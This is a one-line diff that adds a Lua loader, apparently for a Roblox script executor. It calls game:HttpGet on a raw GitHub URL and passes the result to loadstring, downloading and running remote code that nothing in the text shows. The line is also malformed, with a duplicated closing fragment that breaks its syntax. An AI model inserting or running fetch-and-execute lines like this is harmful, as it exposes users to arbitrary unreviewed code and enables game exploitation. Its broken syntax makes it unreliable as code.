@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/weiny-ez/weinz/main/weinzz.lua'))()'))()
